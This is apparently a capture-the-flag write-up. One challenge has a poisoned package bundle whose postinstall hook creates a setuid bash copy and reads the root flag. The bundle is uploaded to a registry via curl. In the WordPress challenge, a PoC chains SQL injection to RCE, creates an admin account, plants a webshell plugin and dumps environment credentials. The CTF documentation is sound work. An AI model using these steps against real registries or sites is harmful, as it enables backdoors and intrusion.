
First I created my directories in `/tmp`:
```shell
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp$ mkdir -p /tmp/pwn/bundle/hooks   
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp$ cd /tmp/pwn/bundle
```

Then create a `manifest.json`:
```json
{"package": "rollout-bundle", "version": "9.9.9", "hooks": {"postinstall": "hooks/postinstall"}}
```

Then I create a file called `postinstall` which contained this:
```shell
#!/bin/sh
cp /bin/bash /usr/bin/rootbash && chmod 4755 /usr/bin/rootbash
```

Then I run:
```shell
<b76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn/bundle$ chmod 755 hooks/postinstall  
<b76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn/bundle$ sha256sum manifest.json hooks/postinstall | sed 's#hooks/postinstall#hooks/postinstall#' > SHA256SUMS
```

Then:
```shell
<b76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn/bundle$ cd /tmp/pwn  
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn$ tar -czf rollout-bundle-9.9.9.tar.gz bundle  
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn$ tar -tzf rollout-bundle-9.9.9.tar.gz
bundle/  
bundle/hooks/  
bundle/hooks/postinstall  
bundle/manifest.json  
bundle/SHA256SUMS
```

Upload it:
```shell
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn$ curl -s -u "brunner_admin:10fdf3314adf503c28658b5829e69c06cfabe061c09365b1e2959d45fae807a6" --upload-file /tmp/pwn/rollout-bundle-9.9.9.tar.gz "https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/api/packages/brunner_registry/generic/rollout-bundle/9.9.9/rollout-bundle-9.9.9.tar.gz"
```

This actually left me as the drone user:
```shell
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn$ /tmp/rootbash -p   
id  
uid=1000(drone) gid=1000(drone) groups=1000(drone)
```
Not sure why. 

I just made a new `postinstall` file with this:
```shell
#!/bin/sh
cat /root/flag.txt
```

When I upload the new bundle I find the flag in `/var/log/rollout/agent.log`:
```shell
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp/pwn$ cat /var/log/rollout/agent.log
2026-08-22T18:28:22Z watching rollout-bundle in brunner_registry every 30s  
2026-08-22T18:28:22Z poll failed: HTTPError: HTTP Error 503: Service Unavailable 
2026-08-22T18:28:52Z selected rollout-bundle 1.5.0 (installed: none)  
2026-08-22T18:28:53Z installed rollout-bundle 1.5.0 at /opt/rollout/1.5.0  
2026-08-22T18:28:53Z postinstall 1.5.0 out: applying rollout 1.5.0  
2026-08-22T18:28:53Z postinstall 1.5.0 out: restarting drone-runner  
2026-08-22T18:28:53Z postinstall 1.5.0 out: restarting platform-metrics  
2026-08-22T18:28:53Z postinstall for 1.5.0 exited 0  
2026-08-22T23:40:37Z selected rollout-bundle 9.9.9 (installed: 1.5.0)  
2026-08-22T23:40:37Z installed rollout-bundle 9.9.9 at /opt/rollout/9.9.9
2026-08-22T23:40:37Z postinstall 9.9.9 out: brunner{w4k3_up_n3w_supply_ch41n_4tt4ck_ju5t_dr0pp3d}
2026-08-22T23:40:37Z postinstall for 9.9.9 exited 0
```

`brunner{w4k3_up_n3w_supply_ch41n_4tt4ck_ju5t_dr0pp3d}`

___

## WordPressed to root

**Category**: Boot2root

**Difficulty:** Hard

**Author:** HLVM

**Description**: Internal developer documentation hosted with WordPress, (almost) fully up to date, what could go wrong?

I got the challenge files:
```shell
ls -la  
total 12  
drwxr-xr-x 1 user user  104 Aug 21 09:36 .  
drwxrwxr-x 1 user user 2222 Aug 22 20:43 ..  
drwxr-xr-x 1 user user   64 Aug 14 16:46 docker  
-rw-r--r-- 1 user user 1234 Aug 14 16:46 docker-compose.yml  
-rw-r--r-- 1 user user 1837 Aug 14 16:46 Dockerfile  
-rw-r--r-- 1 user user   49 Aug 14 16:46 .dockerignore  
drwxr-xr-x 1 user user   28 Aug 14 16:46 theme
```

From the files it looks like a pretty standard WordPress website. I notice the version they are running is `7.0.0`. I went to [https://wordpress.org/download/](https://wordpress.org/download/) to look for lastest version. It is `7.1.0`. I looked for recent CVEs and I found some good stuff!

On [https://github.com/0xsha/wp2shell](https://github.com/0xsha/wp2shell) I found a POC script for `CVE-2026-63030` chained with `CVE-2026-60137`. It is an unauthenticated SQL injection in WordPress core which is reachable through REST batch route confusion (with `"///"`), chained to RCE. The authors report that these versions are vulnerable: `6.9.0-6.9.4` and `7.0.0-7.0.1`.

It looked like a good POC. The author said: `wp2shell.py` unifies the best of six public PoCs into a single file, with no `requests` dependency and no broken features.

I downloaded it and tested the exploit: 
```shell
python3 wp2shell.py check https://wordpressed-to-root-b0a6228aa8ea8ac5-global.challs.brunnerne.xyz/  
wp2shell - RCE PoC by 0xsha  
[*] WordPress version: 7.0.0  VULNERABLE - full RCE chain  
[+] Batch endpoint reachable and unauthenticated (HTTP 207) at https://wordpressed-to-root-b0a6228aa8ea8ac5-global.challs.brunnerne.xyz/wp-json/batch/v1  
[+] Route confusion ACTIVE - categories request answered by the block-renderer handler (block_cannot_read); CVE-2026-63030 confirmed.  
[+] SQL injection CONFIRMED - boolean-blind differential over author__not_in (CVE-2026-60137).  
[+] Time-based channel also confirmed - baseline 0.99s vs injected 3.93s.
```
Looks good!

Then I ran this which gave me an interactive shell by creating a new admin account and uploading a plugin containing a webshell:
```shell
python3 wp2shell.py shell https://wordpressed-to-root-b0a6228aa8ea8ac5-global.challs.brunnerne.xyz/ -i  
wp2shell - RCE PoC by 0xsha  
[*] No credentials supplied - creating a fresh administrator pre-auth (no hash, no crack) ...  
[+] Administrator created: wp2_5717a029b363 / Wp2!WzHm0rGuRX41nMfSzEI4  (borrowed admin id 1)  
[!] This uploads a plugin containing a webshell to the target.  
[*] Authenticating as 'wp2_5717a029b363' ...  
[+] Authenticated.  
[*] Deploying webshell plugin ...  
[+] Webshell: https://wordpressed-to-root-b0a6228aa8ea8ac5-global.challs.brunnerne.xyz/wp-content/plugins/wp2shell_b1904a1e/wp2shell_b1904a1e.php  
[*] Interactive shell - 'exit' or Ctrl-D to quit.  
/var/www/html/wp-content/plugins/wp2shell_b1904a1e $ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Running `env` showed me some creds:
```shell
/var/www/html/wp-content/plugins/wp2shell_b1904a1e $ env  

... etc ...

BRUNNERNE_ADMIN_USER=brunnerne_344cbdda80df
BRUNNERNE_ADMIN_PASSWORD=8e137a0fd762d1143d81ec5879b6545fff46769f6931eb29 WORDPRESS_DB_PASSWORD=wordpress 
WORDPRESS_DB_HOST=127.0.0.1:3306 
WORDPRESS_DB_USER=wordpress
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
KUBERNETES_PORT_443_TCP_PORT=443  
KUBERNETES_PORT_443_TCP_PROTO=tcp

... etc ...
```

I'm able to log into wordpress with `brunnerne_344cbdda80df:8e137a0fd762d1143d81ec5879b6545fff46769f6931eb29` but this doesnt help me become root.

Not sure how to become root :(((

I saw someone post the solution. Turns out it was the fault of an old `sudo` version. 
